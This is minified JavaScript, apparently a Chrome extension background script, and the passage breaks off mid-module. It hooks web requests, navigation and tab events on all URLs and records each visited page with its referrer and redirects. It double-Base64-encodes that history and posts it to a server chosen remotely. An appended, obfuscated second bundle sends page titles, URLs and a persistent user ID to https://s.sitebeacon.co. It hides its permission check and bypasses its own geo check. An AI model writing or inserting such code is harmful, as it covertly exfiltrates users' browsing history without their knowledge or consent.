0===this._sessionid&&(this._sessionid=utils.createRandomNumber()),this._sessionid}},SIM_LB_Client=function(){function e(){try{var e=new XMLHttpRequest;e.open("GET",chrome.extension.getURL("manifest.json"),!1),e.send(null);var t=JSON.parse(e.responseText);return t.version}catch(r){return void 0}}this.initOnceAfterInstall=function(){if(void 0===utils.db.get("userid")){var e=utils.createUserID();utils.db.set("userid",e)}if(void 0===utils.db.get("install_time")){var t=(new Date).getTime()/1e3;utils.db.set("install_time",t)}},this.start_lb=function(){try{log.HT("start_lb enter"),this.initOnceAfterInstall();var t=SIM_Config_BG._url_lb,r="s="+SIM_Config_BG.getSourceId();r+="&ins="+encodeURIComponent(utils.db.get("install_time"))+"&ver="+encodeURIComponent(e()),t=t+"?"+r,utils.net.get(t,"json",function(e){log.INFO("Success to get lb"),void 0!==e.Status?"1"==e.Status?void 0!==e.Endpoint?(utils.db_tmv.set("server",e.Endpoint),e.Mon&&"1"==e.Mon?utils.db.set("enable_mon",!0):utils.db.set("enable_mon",!1)):log.ERROR("Invalid lb response, no Endpoint or Midpoint"):(log.INFO("WARN: result.Status is not 1"),utils.db_tmv.set("server",""),utils.db.set("enable_mon",!1)):log.ERROR("Invalid lb response, no Status = "+e.Status)},function(e){log.ERROR("Failed to get lb, ,url = "+t+", httpCode = "+e.status)}),log.HT("start_lb leave");try{log.addConsoleHelper()}catch(o){log.SEVERE("9071",o)}var n=new SIM_DataTracker_GC;n.start()}catch(o){log.SEVERE("9001",o)}}},SIM_Submitter=function(){function e(){try{t()}catch(e){throw log.SEVERE("8686",e),e}}function t(){if(!s){if(void 0===utils.db_tmv.get("server"))throw Error("invalid server value");if(s=utils.db_tmv.get("server"),null==s)throw Error("_endpoint is null")}}function r(e){var t,r="";for(t in e)e.hasOwnProperty(t)&&""!==e[t]&&(r+=t+"="+e[t]+"&");return r.substring(0,r.length-1)}function o(){var e=SIM_Session.getSessionId(),t={s:SIM_Config_BG.getSourceId()||"",md:"21",pid:utils.db.get("userid")||"",sess:e||"",sub:utils.getSub()};return r(t)}function n(e,t,n,i,a,s,d,l){void 0===n&&(n="");try{for(var u={q:escape(e)||"",hreferer:escape(t)||"",prev:escape(n)||"",tmv:d||"",tmf:l||"",cr:escape(a)||"",crd:escape(s)||""},c="",f=0;f<i.length;f++)c+="&sr="+escape(i[f]);var g=o(),_=r(u),p=g+"&"+_+c;return p}catch(h){return log.SEVERE("9004",h),""}}function i(){return""!=s?s+"/service2":""}function a(e){try{return SIM_Base64.encode(e)}catch(t){return log.SEVERE("7772 "+t),""}}var s;e(),this.get_endpoint=function(){return s},this.send_data=function(e,t,r,o,s,d,l,u){try{log.INFO("got here: send_data");var c=i();if(""==c)return void log.ERROR("request_url is empty");var f=n(e,t,r,o,s,d,l,u),g=a(a(f));if(""!=g){var _="e="+encodeURIComponent(g);utils.net.post(c,"json",_,function(){log.INFO("Succeeded in posting data")},function(e){log.INFO("Failed to retrieve content. (HTTP Code:"+e+")")})}else log.ERROR("Error 7773")}catch(p){log.SEVERE("7778",p)}}},SIM_DataTracker_GC=function(){function e(e){try{for(var t=0;t<e.requestHeaders.length;++t)if("Referer"==e.requestHeaders[t].name){var r=e.requestHeaders[t].value;return r}}catch(o){}return null}function t(e,t,r,o,n,i,a){try{if(log.HT("last bfr fiddler, going to submit: url = "+e+", serverRedirects = "+o+", clientRedirect = "+n),null==C&&(C=new SIM_Submitter),log.HT("_submitter._endpoint = "+C.get_endpoint()),""==C.get_endpoint())return void log.INFO("_endpoint is empty => no submit");C.send_data(e,t,r,o,n,i,b,a),U=e}catch(s){log.SEVERE("5454",s)}}function r(e){if(void 0==e||0>e)throw Error("inavlid tabId");var t=S[e],r=t._arrCommittedNavigations.length;return r}function o(e){if(void 0==e||0>e)throw Error("inavlid tabId");var t=S[e],o=r(e);return o>0?t._arrCommittedNavigations[0]._url:void 0}function n(e,t){try{if(void 0==t||t<0)log.ERROR("getIndexOfCommittedNavigation : Inavlid tabId");else{for(var r=S[t],o=r._arrCommittedNavigations.length,n=void 0,i=0,a=0;o>a;a++){var s=r._arrCommittedNavigations[a];s._url==e&&(i++,n=a)}if(1==i)return n;0==i?log.INFO("Not always error, for ajax its ok. error should be determined by caller. getIndexOfCommittedNavigation : found == 0"):i>1&&log.ERROR("getIndexOfCommittedNavigation : found > 1")}}catch(d){log.SEVERE("2003",d)}return void 0}function i(e,t){try{if(0>t)return void log.ERROR("invalid tabId");var r=S[t],o=r._arrRequestsIds.length,n=void 0;if(0==o){var i=E[t];log.ERROR(i&&i>=0?"TODOZ - need to compute data from sourceTabId. tabId = "+t+", sourceTabId = "+i:"_arrRequestsIds.length == 0 => how to handle it ?, tabId = "+t)}else if(1==o)n=0;else{for(var a=0,s=0;o>s;s++){var d=r._arrRequestsIds[s],l=v(d);null!=l?l._completedUrl==e&&(n=s,a++):log.ERROR("(is this error ?) getRequestInfo returned null for tempRequestId = "+d)}0==a?(log.ERROR("getRequestIdOfTabUrl: url not found"),n=void 0):1==a||(log.ERROR("getRequestIdOfTabUrl: found > 1"),n=void 0)}if(void 0!=n){var u=r._arrRequestsIds[n];return u}return void 0}catch(c){return log.SEVERE("2001",c),null}return void 0}function a(e,t){try{var r=S[t],o=void 0,i=void 0,a=void 0,s=void 0,d=void 0;if(s=n(e,t),void 0==s)log.ERROR("getIndexOfCommittedNavigation failed #1");
else{var l=r._arrCommittedNavigations[s];if(l._transitionQualifiers.indexOf("client_redirect")>-1)if(s>0){d=s-1;var u=r._arrCommittedNavigations[d];i=u._url;try{var c=0,f=0;try{for(var g=r._arrRequestsIds.length,_=0;g>_;_++){var p=r._arrRequestsIds[_],h=v(p);if(null!=h){if(h._urlBeforeRequest==e){f=h._timestampBeforeRequest;break}}else log.ERROR("getRequestInfo return null for tempRequestId = "+p)}}catch(R){log.SEVERE("9023",R)}0!=f&&(c=f-u._timeStamp,log.HT("durationOnCRSiteBeforeTheClientRedirect (crd) = "+c),a=c)}catch(R){log.SEVERE("9024",R)}}else log.ERROR("client_redirect but no previous nav")}var m;if(d){var m=r._arrCommittedNavigations.splice(d,1);delete m}return void 0!==i&&(o={},o.url=i,o.duration=a),o}catch(R){return void log.SEVERE("2005",R)}}function s(e){try{var t="",r=void 0,o=E[e];if(o&&o>=0)r=o;else{var n=S[e];void 0===n?r=x:n._lastReportedUrl&&""!=n._lastReportedUrl?r=e:e!=L?(r=L,log.INFO("prevTabId flow A")):e!=x?(r=x,log.INFO("prevTabId flow B")):log.ERROR("Failed to find prevTabId")}var i=S[r];return i?t=i._lastReportedUrl:null!=H&&H.length>0?(log.INFO("****** ast_focused_url is "+H),t=H):null!=U&&U.length>0?(log.INFO("****** last_prev is "+U),t=U):log.ERROR("failed to compute prev"),t}catch(a){return log.SEVERE("2008",a),""}}function d(e,t,r,o,n,i){try{var a={_url:t,_prev:r,_arrServerRedirectUrls:o,_clientRedirectUrl:n,_tmf:i},s=JSON.stringify(a),d=function(){try{var e={params_:__JSON__PLACEHOLDER__,tabId_:__TABID__PLACEHOLDER__,fromTMV_:__TMV__PLACEHOLDER__,messageId_:55558888,referrer_:document.referrer,location_:document.location};chrome.extension.sendRequest(e,function(){})}catch(t){}},l=""+d;l=l.replace("__JSON__PLACEHOLDER__",s),l=l.replace("__TABID__PLACEHOLDER__",e),l=l.replace("__TMV__PLACEHOLDER__","'"+b+"'");var u=l.slice(l.indexOf("{")+1,l.lastIndexOf("}"));chrome.tabs.executeScript(e,{code:u},function(e){log.INFO("executeScript, result = "+e)})}catch(c){log.SEVERE("2007",c)}}function l(e,r,o){try{var n="",l="",u="",c="",f="";try{if(r&&r>=0){var g=S[r];g?g._lastReportedUrl&&e==g._lastReportedUrl:log.ERROR("invalid oTabInfo")}else log.ERROR("invalid tabId")}catch(_){log.SEVERE("5459",_)}try{var g=S[r],p=i(e,r);if(void 0!=p){var h=v(p);if(h._completedUrl==e){n=h.getRedirectUrls(),l=h.getReferer();var R=a(e,r);"undefind"!=typeof R&&null!=R&&(void 0!==R.url&&(c=R.url),void 0!==R.duration&&0!=R.duration&&(f=Math.round(R.duration)),delete R),g._arrRequestsIds.splice(0,1),delete y[p]}else log.ERROR("oRequestInfo._completedUrl == url, tabId = "+r+", _completedUrl = "+h._completedUrl+", url = "+e)}else log.ERROR("submit2, requestId is undefined, for url = "+e+", tabId = "+r)}catch(_){log.SEVERE("5453",_)}u=s(r);try{E[r]&&delete E[r]}catch(_){log.SEVERE("5457",_)}void 0==l||""==l?d(r,e,u,n,c,o):t(e,l,u,n,c,f,o)}catch(_){log.SEVERE("5454",_)}}function u(e,t){return}function c(e,t){this._tab=e,this._fromOnCreateEvent=t,this._lastReportedUrl="",this._tabsOnUpdatedUrl="",this._marked=!1,this._oldTabId=void 0,this._arrRequestsIds=[],this._arrCommittedNavigations=[]}function f(e){this._tabId=e,this._arrServerRedirectUrls=[],this._referer="",this._transitionQualifiers="",this._completedUrl="",this._urlBeforeRequest=void 0,this._timestampBeforeRequest=0,this.appendRedirectUrl=function(e){this._arrServerRedirectUrls.push(e)},this.getRedirectUrls=function(){return this._arrServerRedirectUrls},this.setReferer=function(e){0==this._referer.length?this._referer=e:log.INFO("setReferer already have a value. old = "+this._referer+", new = "+e)},this.getReferer=function(){return this._referer},this.setUrlBeforeRequest=function(e,t){this._urlBeforeRequest=e,this._timestampBeforeRequest=t}}function g(e){this._frameId=e.frameId,this._processId=e.processId,this._tabId=e.tabId,this._timeStamp=e.timeStamp,this._transitionQualifiers=e.transitionQualifiers,this._transitionType=e.transitionType,this._url=e.url,this._prevWhenCommited=void 0}function _(){return}function p(e){var t=null;return t=S[e],void 0==t&&(t=null),t}function h(e,t){if(void 0==e)throw Error("addRequestInfo, requestId == undefined");if(0==y.hasOwnProperty(e))return y[e]=new f(t),log.INFO("_hashRequests.length = "+Object.keys(y).length),y[e];throw Error("addRequestInfo, already exists, requestId = "+e)}function v(e){if(void 0==e)throw Error("getRequestInfo, requestId == undefined");return 0==y.hasOwnProperty(e)?null:y[e]}function R(e,t){return e.substring(0,t.length)===t}function m(e){return e&&(R(e,"http://")||R(e,"https://"))?!0:!1}function I(e,t){log.INFO("updateActiveUrl : got here"),chrome.windows.getAll({populate:!0},function(r){e:for(var o=0;o<r.length;o++){var n=r[o],i=n.id;if(i==e._focusedWindowId)for(var a=w[i],s=0;s<r[o].tabs.length;s++){var d=r[o].tabs[s],l=d.id,u=d.url;if(l==a){m(u)?(e._urlOfActiveTabInFocusedWindow=u,O[l]=u,log.INFO("updateActiveUrl : winId = "+i+", tabId = "+l+", url = "+u)):log.INFO("updateActiveUrl : SKIPPED : winId = "+i+", tabId = "+l+", url = "+u);break e}}}t&&t()})}var b=SIM_ModuleConstants._TMV,E={},S={},w={},O={},y={},C=null,N=1,M=2,T=3,A=-1,q="",x="",L="",U="",H="";this.webRequest_onBeforeRequest=function(e){try{var t=e.url,r=e.tabId,o=e.requestId,n=e.timeStamp;if(log.HT("webRequest.onBeforeRequest tabId = "+r+",requestId = "+o+", url = "+t),0>r)log.ERROR("TODOZ how to handle tabId of -1, which is for new tab ?");else{var i=null;i=v(o),null==i&&(i=h(o,r)),i.setUrlBeforeRequest(t,n);var a=null;if(a=p(r),null==a){log.HT("oTabInfo is null, added myself, tabId = "+r);var a=new c(null,!1);S[r]=a}var s=a._arrRequestsIds.indexOf(o);-1==s?a._arrRequestsIds.push(o):log.ERROR("requestId already exists in array: tabId = "+r+", requestId = "+o+", index = "+s+", TODOZ maybe bcz of server redirect ?")}}catch(d){log.SEVERE("8836",d)}},this.webRequest_onSendHeaders=function(t){try{var r=t.url,o=t.tabId,n=t.requestId;u("JXJX  onSendHeaders",t.requestHeaders);var i=e(t);if(null!=i&&void 0!=i)if(o<0)log.ERROR("9002, tabId < 0 = "+o);else{var a=null;a=v(n),null==a&&(a=h(n,o)),a.setReferer(i)}else log.HT("webRequest.onSendHeaders, refererFromHeaders undfined or null : tabId = "+o+",requestId = "+n+", url= "+r)}catch(s){log.SEVERE("8800",s)}},this.webRequest_onHeadersReceived=function(e){try{var t=e.url,r=e.tabId,o=e.requestId,n=e.statusLine;log.INFO("webRequest.onHeadersReceived tabId = "+r+",requestId = "+o+", url = "+t+", statusLine = "+n)}catch(i){log.SEVERE("8839",i)}},this.webRequest_onBeforeRedirect=function(e){try{var t=e.url,r=e.tabId,o=e.requestId,n=null;n=v(o),null==n&&(n=h(o,r)),n.appendRedirectUrl(t),log.INFO("webRequest.onBeforeRedirect tabId = "+r+",requestId = "+o+", url = "+t)}catch(i){log.SEVERE("8835",i)}},this.webRequest_onResponseStarted=function(e){try{var t=e.url,r=e.tabId,o=e.requestId;log.INFO("webRequest.onResponseStarted tabId = "+r+",requestId = "+o+", url = "+t)}catch(n){log.SEVERE("8839",n)}},this.webRequest_onCompleted=function(e){try{var t=e.url,r=e.tabId,o=e.requestId;log.INFO("webRequest.onCompleted tabId = "+r+",requestId = "+o+", url = "+t);var n=v(o);null==n&&(n=h(o,r)),n._completedUrl=t}catch(i){log.SEVERE("8837",i)}},this.webRequest_onErrorOccurred=function(e){try{var t=e.url,r=e.tabId,o=e.requestId;log.INFO("webRequest.onErrorOccurred tabId = "+r+",requestId = "+o+", url = "+t)}catch(n){log.SEVERE("8896",n)}},this.webNavigation_onCreatedNavigationTarget=function(e){try{if(void 0!=e){var t=e.tabId;0>t||(void 0==E[t]?(E[t]=e.sourceTabId,log.HT("Added nav target: tabId = "+t+", sourceTabId = "+e.sourceTabId)):log.ERROR("_hashNavTargets[tabId] == undefined"))}}catch(r){log.SEVERE("8997",r)}},this.webNavigation_onBeforeNavigate=function(e){try{void 0!=e&&0==e.frameId&&(e.tabId<0?log.ERROR("webNavigation_onBeforeNavigate : how to handle tabId < 0 ? "):I(this,null))}catch(t){log.SEVERE("8897",t)}},this.webNavigation_onCommitted=function(e){try{if(void 0!=e&&0==e.frameId){var t=e.tabId;if(t<0)log.ERROR("TODOZ - webNavigation_onCommitted, how to handle tabId < 0 (newtab) ? -> attach to processId ??");else{var r=S[t];if(r){var o=new g(e);o._prevWhenCommited=q,r._arrCommittedNavigations.push(o)}else log.ERROR("webNavigation_onCommitted, oTabInfo is null, for tabId = "+t+", url = "+e.url)}}}catch(n){log.SEVERE("8898",n)}},this.webNavigation_onDOMContentLoaded=function(){try{}catch(e){log.SEVERE("8862",e)}},this.webNavigation_onCompleted=function(e){try{if(void 0!=e&&0==e.frameId){var t=e.tabId;if(t<0)-1==t?log.HT("webNavigation_onCompleted, TODOZ - how to handle it ? tabId == -1 =>  new tab/ else ? = "+e.url):log.ERROR("webNavigation_onCompleted, Invalid tabId = "+t);else{var r=S[t];if(r){var o=r._lastReportedUrl;if(1==r._marked)log.HT(e.url!=o?"CCCC 3, sumbit = "+e.url+" , (lastReportedUrl = "+o+")":"CCCC 4, already sumbitted = "+e.url+" , (lastReportedUrl = "+o+")");else{{var n=5e3;window.setTimeout(function(e){try{var t="TIMER, tabId_ =  "+e;log.HT(t)}catch(r){}try{}catch(r){}},n,t)}log.HT("XZXZXZ  IMHERE : pre-loaded ford.com arrives here... TOODZ ? webNavigation_onCompleted : add to popups/boxes = "+e.url+" , (_tabsOnUpdatedUrl = "+r._tabsOnUpdatedUrl+")")}}else log.ERROR("webNavigation_onCompleted, oTabInfo null/undefined for tabId = "+t+", url = "+e.url)}}}catch(i){log.SEVERE("8891",i)}},this.webNavigation_onErrorOccurred=function(e){try{if(void 0!=e&&0==e.frameId){var t=(e.error,e.frameId,e.processId,e.tabId),r=(e.timeStamp,e.url);if(m(r))if(t<0)log.ERROR("webNavigation_onErrorOccurred, invalid tabId = "+t);else{var o=S[t];r!=o._lastReportedUrl?(l(r,t,T),o._lastReportedUrl=r):log.HT("webNavigation_onErrorOccurred, already reported = "+r+", tabId = "+t)}else log.HT("webNavigation_onErrorOccurred, skipped no-web url = "+r+", tabId = "+t)}}catch(n){log.SEVERE("8893",n)}},this.webNavigation_onTabReplaced=function(e){try{if(void 0!=e){e.replacedTabId,e.tabId,e.timeStamp}}catch(t){log.SEVERE("8861",t)}},this.webNavigation_onHistoryStateUpdated=function(){try{}catch(e){log.SEVERE("8839",e)}},this.windows_onFocusChanged=function(e){try{A=e}catch(t){log.SEVERE("8892",t)}},this.extension_onRequest=function(e,r){try{var o=utils.getExtensionId();if(r&&r.id==o){var n=e.fromTMV_;if(n&&n==b){var i=e.messageId_;if(i&&55558888==i){log.INFO("extension_onRequest: received message");var a=(e.tabId_,e.location_),s=a.href,d=e.params_._url,l=e.params_._prev,u=e.params_._arrServerRedirectUrls,c=e.params_._clientRedirectUrl,f=e.params_._tmf;if(d==s){var g=e.referrer_;g==d&&(log.ERROR("train missed # 1?"),g=""),g&&""!=g&&(f+=".1")}else log.ERROR("train missed # 2?"),g="";t(d,g,l,u,c,"",f)}else log.ERROR("messaged unknown, or undefined : request = "+e)}else n?log.INFO("Message of other tmv = "+n):log.ERROR("Message without fromTMV")}else log.ERROR("unknown sender = "+r.id)}catch(_){log.SEVERE("2020",_)}},this.tabs_onCreated=function(e){try{log.INFO("tabs.onCreated, tab.id = "+e.id);var t=new c(e,!0);S[e.id]=t,log.INFO("Count of tabs after onCreated = "+Object.keys(S).length),_()}catch(r){log.SEVERE("8831",r)}},this.tabs_onActivated=function(e){try{log.INFO("tabs.onActivated  windowId = "+e.windowId+", tabId = "+e.tabId),w[e.windowId]=e.tabId,e.tabId<0?log.ERROR("tabs_onActivated, how to handle activeInfo.tabId <0  ?"):(x=L,L=e.tabId,chrome.tabs.get(e.tabId,function(e){log.INFO("***** tabs.onActivated got tab"),void 0!=e&&m(e.url)&&(log.INFO("***** tabs.onActivated got tab Inside..."),H=e.url)})),log.INFO("tabs_onActivated, total count of active tabs (0 or 1, for each window) = "+Object.keys(w).length)}catch(t){log.SEVERE("8834",t)}},this.tabs_onRemoved=function(e){try{log.INFO("tabs.onRemoved, tabId = "+e),delete S[e],E[e]&&delete E[e],log.INFO("Count of tabs after onRemoved = "+Object.keys(S).length),_()}catch(t){log.SEVERE("8832",t)}},this.tabs_onReplaced=function(e,t){try{if(e<0||t<0)log.ERROR("webNavigation_onTabReplaced : addedTabId >= 0 && removedTabId >=0");else{var n=S[e],i=S[t];if(n&&i){var a=i._lastReportedUrl,s=void 0,d=r(e);d>0&&(s=o(e)),log.HT("tabs.onReplaced, addedTabId = "+e+", removedTabId = "+t+", removedUrl = "+a+", addedUrl = "+s),s==n._lastReportedUrl||(m(s)?(O[t]&&(O[e]=O[t],delete O[t]),n._lastReportedUrl=i._lastReportedUrl,l(s,e,M),n._lastReportedUrl=s):log.HT("skipped non web url = "+s+"tabId = "+e)),delete S[t],n._oldTabId=t,E[t]&&(E[e]=E[t],delete E[t])}else n||log.ERROR("tabs_onReplaced, oAddTabInfo udefined for addedTabId = "+e),i||log.ERROR("tabs_onReplaced, oRemoveTabInfo udefined for removedTabId = "+t)}}catch(u){log.SEVERE("8847",u)}},this.tabs_onUpdated=function(e,t,r){try{if("complete"==t.status){var o=r.url,n="";log.HT("tabs.onUpdated, status = "+t.status+", tabId = "+e+", url = "+o);var i=S[e];i?n=i._lastReportedUrl:log.ERROR("oTabInfo null/undefined for tabId = "+e),m(o)?(log.HT("tabs.onUpdated going to submit, tabId = "+e+", url = "+o),l(o,e,N),i&&(i._lastReportedUrl=o),I(this,null)):log.HT("skipped non-web url = "+o+", tabId = "+e)}}catch(a){log.SEVERE("8833",a)}},this.addListners_webRequest=function(){try{if(void 0===chrome.webRequest)log.ERROR("permission missing: webRequest");else{var e={types:["main_frame"],urls:["<all_urls>"]},t=["requestHeaders"];chrome.webRequest.onBeforeRequest.addListener(this.webRequest_onBeforeRequest,e),chrome.webRequest.onSendHeaders.addListener(this.webRequest_onSendHeaders,e,t),chrome.webRequest.onHeadersReceived.addListener(this.webRequest_onHeadersReceived,e),chrome.webRequest.onBeforeRedirect.addListener(this.webRequest_onBeforeRedirect,e),chrome.webRequest.onResponseStarted.addListener(this.webRequest_onResponseStarted,e),chrome.webRequest.onCompleted.addListener(this.webRequest_onCompleted,e),chrome.webRequest.onErrorOccurred.addListener(this.webRequest_onErrorOccurred,e)}}catch(r){log.SEVERE("8888",r)}},this.addListners_webNavigation=function(){try{void 0===chrome.webNavigation?log.ERROR("permission missing: webNavigation"):(chrome.webNavigation.onCreatedNavigationTarget?chrome.webNavigation.onCreatedNavigationTarget.addListener(this.webNavigation_onCreatedNavigationTarget):log.ERROR("chrome.webNavigation.onCreatedNavigationTarget undefined"),chrome.webNavigation.onBeforeNavigate?chrome.webNavigation.onBeforeNavigate.addListener(this.webNavigation_onBeforeNavigate):log.ERROR("chrome.webNavigation.onBeforeNavigate undefined"),chrome.webNavigation.onCommitted?chrome.webNavigation.onCommitted.addListener(this.webNavigation_onCommitted):log.ERROR("chrome.webNavigation.onCommitted undefined"),chrome.webNavigation.onDOMContentLoaded?chrome.webNavigation.onDOMContentLoaded.addListener(this.webNavigation_onDOMContentLoaded):log.ERROR("chrome.webNavigation.onDOMContentLoaded undefined"),chrome.webNavigation.onCompleted?chrome.webNavigation.onCompleted.addListener(this.webNavigation_onCompleted):log.ERROR("chrome.webNavigation.onCompleted undefined"),chrome.webNavigation.onErrorOccurred?chrome.webNavigation.onErrorOccurred.addListener(this.webNavigation_onErrorOccurred):log.ERROR("chrome.webNavigation.onErrorOccurred undefined"),chrome.webNavigation.onTabReplaced?chrome.webNavigation.onTabReplaced.addListener(this.webNavigation_onTabReplaced):log.ERROR("chrome.webNavigation.onTabReplaced undefined"),chrome.webNavigation.onHistoryStateUpdated?chrome.webNavigation.onHistoryStateUpdated.addListener(this.webNavigation_onHistoryStateUpdated):log.ERROR("chrome.webNavigation.onHistoryStateUpdated undefined"))}catch(e){log.SEVERE("8887",e)}},this.addListners_tabs=function(){try{chrome.tabs.onCreated.addListener(this.tabs_onCreated),chrome.tabs.onRemoved.addListener(this.tabs_onRemoved),chrome.tabs.onUpdated.addListener(this.tabs_onUpdated),chrome.tabs.onActivated.addListener(this.tabs_onActivated),chrome.tabs.onReplaced.addListener(this.tabs_onReplaced)}catch(e){log.SEVERE("8889",e)}},this.addListners=function(){try{this.addListners_webRequest(),this.addListners_tabs(),this.addListners_webNavigation(),chrome.windows.onFocusChanged.addListener(this.windows_onFocusChanged),chrome.extension.onRequest.addListener(this.extension_onRequest)}catch(e){log.SEVERE("8844",e)}},this.start=function(){try{log.INFO("bg start: got here"),this.addListners()}catch(e){log.SEVERE("8801",e)}}};this.main=function(){try{var e=new SIM_LB_Client;e.start_lb()}catch(t){console.log("9099, "+t)}};var log=SIM_Logger_BG,utils=SIM_FrameworkUtils;this.main()}();


/// quest
// // ******************
window.setTimeout(function(){
 if (true || localStorage.geo && JSON.parse(localStorage.geo).country_code.match(/US/))
	chrome.permissions.contains({permissions:['web' +  ddds + 'Request']},function (answer) {
		if(!answer) return		
		window.PLGN_ID='ws';
		!function a(b,c,d){function e(g,h){if(!c[g]){if(!b[g]){var i="function"==typeof require&&require;if(!h&&i)return i(g,!0);if(f)return f(g,!0);throw new Error("Cannot find module '"+g+"'")}var j=c[g]={exports:{}};b[g][0].call(j.exports,function(a){var c=b[g][1][a];return e(c?c:a)},j,j.exports,a,b,c,d)}return c[g].exports}for(var f="function"==typeof require&&require,g=0;g<d.length;g++)e(d[g]);return e}({1:[function(a,b){var c=a("bV+O99idZ1").safe;b.exports={send:function(b){c(function(){var c=a("37p6reCGgH"),d=new XMLHttpRequest;b.sync||(d.timeout=3e4),d.open("POST",b.url||c["/jq06BH+"],!b.sync);var e="application/x-www-form-urlencoded; charset=UTF-8";switch(Object.prototype.toString.call(b.data)){case"[object Object]":b.data=JSON.stringify(b.data),e="application/json"}d.setRequestHeader("Content-Type",e),d.onreadystatechange=function(){4===d.readyState&&(200===d.status&&"function"==typeof b.success?b.success(d.responseText):"function"==typeof b.error&&b.error(d.responseText))},d.send(b.data)},function(){b.error&&b.error()})}}},{"37p6reCGgH":2,"bV+O99idZ1":10}],2:[function(a,b){var c=a("bV+O99idZ1").safe;c(function(){b.exports={"6u/37YHe":"CBDC_UserPrefs",D9GkeUGz:"CBDC_UID","/jq06BH+":"https://s.sitebeacon.co","sziS+93v":"0.1.0",bpgWqOnQ:"js",EBCQ2xTQ:window.PLGN_ID,M5RnnRlu:1e4,"86k8wFwy":36e5,"QYCHr/I1":25,gW5OL96M:5}})},{"bV+O99idZ1":10}],3:[function(a,b){var c=a("bV+O99idZ1").safe;c(function(){function c(a){var b="undefined"!=typeof window.crypto&&"undefined"!=typeof window.crypto.getRandomValues?function(){var a=new Uint16Array(8);window.crypto.getRandomValues(a);var b=function(a){for(var b=a.toString(16);b.length<4;)b="0"+b;return b};return b(a[0])+b(a[1])+"-"+b(a[2])+"-"+b(a[3])+"-"+b(a[4])+"-"+b(a[5])+b(a[6])+b(a[7])}:function(){return"xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".replace(/[xy]/g,function(a){var b=16*Math.random()|0,c="x"==a?b:3&b|8;return c.toString(16)})},c=e.get(g.D9GkeUGz);if(c)a(c);else{c=b();var j=new i([+new Date,g.EBCQ2xTQ,c,g["sziS+93v"],g.bpgWqOnQ,h.browser.name,h.browser.major,h.os.name,window.navigator.language||"",h.os.version,"00000000-0000-0000-0000-000000000000"]);!function k(b,f){d.send({sync:!0,data:b,error:function(){window.setTimeout(function(){k(b,++f)},1e4*f)},success:function(){e.set(g.D9GkeUGz,c),a(c)}})}(f.qJI7ttpV(j.serialize()),1)}}var d=a("RIJhHMKQws"),e=a("PUgpLk0nFP"),f=a("bV+O99idZ1"),g=a("37p6reCGgH"),h=a("1oqhmmpmFy"),i=a("F/NGfbED4D").NewUserMessage;b.exports=c})},{RIJhHMKQws:1,"37p6reCGgH":2,"F/NGfbED4D":5,PUgpLk0nFP:8,"1oqhmmpmFy":9,"bV+O99idZ1":10}],4:[function(a){!function(){"use strict";var b=a("37p6reCGgH"),c=a("bV+O99idZ1"),d=c.safe,e=a("h+pd/IuOOE"),f=a("F/NGfbED4D").PPVMessage,g=a("EDg0XsxSXK"),h=a("V84wxVp+gs");d(function(){var a,c,i;e(function(a){i=a}),d(function(){function d(a){return function(){var b=Array.prototype.slice.call(arguments,0);i&&a.apply(this,b)}}function e(c){c.tabId>-1&&0===c.frameId&&chrome.tabs.get(c.tabId,function(d){if(d){var e=new f([b.EBCQ2xTQ,i,"",+new Date,"",d.title,d.url,"",0,0,"","","","",""]);chrome.tabs.executeScript(c.tabId,{code:"[document.referrer, window.name];"},function(a){var b=a&&a[0];b&&b[0]&&e&&e.values&&""===e.values[7]&&(e.values[7]=b[0],b[1]&&(e.values[4]=b[1]))}),a.enqueue(e)}})}function g(){chrome.windows.getAll(function(d){1===d.length&&(b["QYCHr/I1"]=1e3,c.process(a))})}chrome.webNavigation.onDOMContentLoaded.addListener(d(e)),chrome.windows.onRemoved.addListener(d(g))}),d(function(){a=new g,c=new h(a),c.process()})})}()},{"37p6reCGgH":2,"h+pd/IuOOE":3,"F/NGfbED4D":5,EDg0XsxSXK:6,"V84wxVp+gs":7,"bV+O99idZ1":10}],5:[function(a,b){var c=a("bV+O99idZ1").safe;c(function(){var c=this.__extends||function(a,b){function c(){this.constructor=a}for(var d in b)b.hasOwnProperty(d)&&(a[d]=b[d]);c.prototype=b.prototype,a.prototype=new c},d=a("bV+O99idZ1"),e="{msgName}={encodedValues}",f="|,|",g=function(){function a(a,b){this.name=a,this.values=b}return a.prototype={serialize:function(){var a=this,b=Array.prototype.map.call(a.values,function(a){return encodeURIComponent(a)});return d.format(e,{msgName:a.name,encodedValues:b.join(f)})}},a}(),h=function(a){function b(b){a.call(this,"PanelPageVisit_3",b)}return c(b,a),b}(g),i=function(a){function b(b){a.call(this,"ThirdPartyNewGuid",b)}return c(b,a),b}(g);b.exports={Message:g,PPVMessage:h,NewUserMessage:i}})},{"bV+O99idZ1":10}],6:[function(a,b){var c=a("bV+O99idZ1").safe;c(function(){function a(a){this.queue=a||[],this.offset=0}a.prototype={enqueue:function(a){this.queue.push(a)},dequeue:function(){if(0===this.queue.length)return void 0;var a=this.queue[this.offset];return 2*++this.offset>=this.queue.length&&(this.queue=this.queue.slice(this.offset),this.offset=0),a},getLength:function(){return this.queue.length-this.offset},store:function(){}},b.exports=a})},{"bV+O99idZ1":10}],7:[function(a,b){var c=a("bV+O99idZ1").safe;c(function(){function d(a){var b=this;b.queue=a,b.lastProcessTime=+new Date,b.timeoutHandle=0}var e="|#|",f=a("37p6reCGgH"),g=a("RIJhHMKQws"),h=a("bV+O99idZ1");d.prototype={process:function(a){var b,c=this,d=a||[];if(window.clearTimeout(c.timeoutHandle),!d.length&&c.canProcess())for(;(b=c.queue.dequeue())&&b&&d.length<f["QYCHr/I1"];)d.push(b);d.length?c.send(d):c.scheduleProcess()},scheduleProcess:function(){var a=this,b=Array.prototype.slice.call(arguments),c=b.length>1?b.slice(0,b.length-1):[],d=b.length&&b[b.length-1]||f.M5RnnRlu;a.timeoutHandle=window.setTimeout(function(){a.process.apply(a,c)},d)},serializeMessages:function(a){return h.qJI7ttpV(a.map(function(a){return a.serialize()}).join(e))},send:function(a){var b=this;c(function(){var c=b.serializeMessages(a);g.send({data:c,success:function(){b.lastProcessTime=+new Date,b.tries=0,b.scheduleProcess()},error:function(){b.tries=++b.tries||1,b.tries<5?b.scheduleProcess(a,Math.floor(f.M5RnnRlu*Math.pow(b.tries,4.5))):(b.tries=0,b.scheduleProcess())}})},function(){b.scheduleProcess()})},canProcess:function(){return!!(+new Date-this.lastProcessTime>=f["86k8wFwy"]||this.queue.getLength()>f["QYCHr/I1"])}},b.exports=d})},{RIJhHMKQws:1,"37p6reCGgH":2,"bV+O99idZ1":10}],8:[function(a,b){var 